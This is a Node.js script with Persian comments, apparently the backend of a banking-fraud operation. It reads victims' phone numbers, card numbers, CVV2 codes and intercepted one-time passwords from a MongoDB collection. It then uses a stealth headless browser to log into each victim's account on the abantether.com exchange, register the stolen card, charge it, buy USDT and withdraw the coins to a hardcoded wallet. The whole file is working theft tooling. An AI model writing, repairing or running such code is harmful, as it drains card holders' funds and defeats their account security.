require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

// تنظیمات
const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`)),
  debug: (msg) => console.log(chalk.gray(`[${new Date().toLocaleString('fa-IR')}] DEBUG → ${msg}`))
};

let collection;

async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  log.s("اتصال به MongoDB برقرار شد");

  const db = client.db("ZarrinApp");
  collection = db.collection("zarinapp");

  const count = await collection.countDocuments({});
  log.s(`تعداد داکیومنت در zarinapp: ${count}`);

  if (count > 0) {
    const sample = await collection.findOne({});
    log.s("نمونه داکیومنت:");
    console.log(JSON.stringify(sample, null, 2));
  }
}

function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  const ready = phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;

  return ready;
}

async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}...`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

async function clearAndType(page, selector, text) {
  await page.evaluate(sel => {
    const el = document.querySelector(sel);
    if (el) el.value = '';
  }, selector);
  await page.type(selector, text);
}

async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  let browser = null;

  log.start(`شروع پردازش: ${phone}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });

    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });

    // ورود با سلکتورهای فیکس‌شده (به‌روز با سایت)
    log.i("در حال ورود با شماره: " + phone);

    // سلکتورهای جدید برای فیلد تلفن (به‌روز 21 نوامبر 2025)
    await page.waitForSelector('input[placeholder*="شماره"], input[type="tel"], input[placeholder*="09"], input.phone-input', { timeout: 30000 });
    await page.click('input[placeholder*="شماره"], input[type="tel"], input[placeholder*="09"], input.phone-input');
    await page.type('input[placeholder*="شماره"], input[type="tel"], input[placeholder*="09"], input.phone-input', phone);

    // دکمه ادامه (سلکتورهای جدید)
    await page.click('button[type="submit"], button:has-text("ادامه"), button:has-text("ورود"), .btn-submit, .submit-btn', { timeout: 10000 });
    log.i("دکمه ادامه کلیک شد — در انتظار OTP ورود");

    const otpLogin = await waitForOtp(doc._id, "otp_login");
    await page.waitForSelector('input[placeholder*="کد"], input[type="text"], input[placeholder*="تأیید"], input.otp-input', { timeout: 15000 });
    await clearAndType(page, 'input[placeholder*="کد"], input[type="text"], input[placeholder*="تأیید"], input.otp-input', otpLogin);
    await page.click('button:has-text("تأیید"), button[type="submit"]', { timeout: 10000 });
    log.s("ورود با موفقیت انجام شد");

    // ثبت کارت
    try {
      await page.click('text=کیف پول, .wallet-menu', { timeout: 10000 });
      await page.click('text=کارت بانکی, .bank-card-menu', { timeout: 10000 });
      await page.click('text=افزودن کارت, .add-card-btn', { timeout: 10000 });
    } catch (e) {
      log.i("کارت قبلاً ثبت شده یا منو عوض شده");
    }

    const cardNum = getValue(doc.cardNumber).replace(/\D/g, "");
    const cvv2 = getValue(doc.cvv2).toString();
    const month = getValue(doc.bankMonth).toString().padStart(2, "0");
    const yearRaw = getValue(doc.bankYear);
    const yearInput = yearRaw > 1000 ? (yearRaw - 1300).toString().padStart(2, "0") : yearRaw.toString().padStart(2, "0");

    await page.type('input[placeholder="شماره کارت"], input[name="cardNumber"]', cardNum);
    await page.type('input[placeholder="CVV2"], input[name="cvv2"]', cvv2);
    await page.type('input[placeholder="ماه"], input[name="month"]', month);
    await page.type('input[placeholder="سال"], input[name="year"]', yearInput);
    await page.click('button:has-text("ثبت کارت"), .btn-submit-card', { timeout: 10000 });
    log.i("درخواست OTP ثبت کارت");

    const otpCard = await waitForOtp(doc._id, "otp_register_card");
    await clearAndType(page, 'input[placeholder*="کد"], input[name="otp"]', otpCard);
    await page.click('button:has-text("تأیید"), .btn-verify', { timeout: 10000 });
    log.s("کارت ثبت شد");

    // شارژ
    await page.click('text=واریز تومان, .deposit-menu', { timeout: 10000 });
    await page.type('input[placeholder="مبلغ"], input[name="amount"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("پرداخت"), .btn-pay', { timeout: 10000 });

    const otpPay = await waitForOtp(doc._id, "otp_payment");
    await clearAndType(page, 'input[placeholder*="کد"], input[name="otp"], input#otp', otpPay);
    await page.click('button:has-text("تأیید"), .btn-confirm-pay', { timeout: 10000 });
    log.s("شارژ موفق");

    // خرید
    await page.click('text=بازار, .market-menu', { timeout: 10000 });
    await page.click('text=تتر, .usdt-pair', { timeout: 10000 });
    await page.type('input[placeholder="مبلغ"], input[name="amount"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید"), .btn-buy', { timeout: 10000 });
    log.s("تتر خریداری شد");

    // برداشت
    await page.click('text=برداشت, .withdraw-menu', { timeout: 10000 });
    await page.click('text=تتر, .usdt-withdraw', { timeout: 10000 });
    await page.type('input[placeholder="آدرس"], input[name="address"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"], input[name="amount"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
    await page.click('button:has-text("برداشت"), .btn-withdraw', { timeout: 10000 });
    log.s("درخواست برداشت ارسال شد");

    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed" } });

  } catch (err) {
    log.e(`خطا: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
  } finally {
    if (browser) await browser.close();
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

async function startPolling() {
  await connectDB();

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(5).toArray();

      if (users.length === 0) {
        log.i("در انتظار دیوایس جدید...");
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          processUser(user);
        }
      }
    } catch (err) {
      log.e("Polling error: " + err.message);
    }
  }, 5000);
}

startPolling();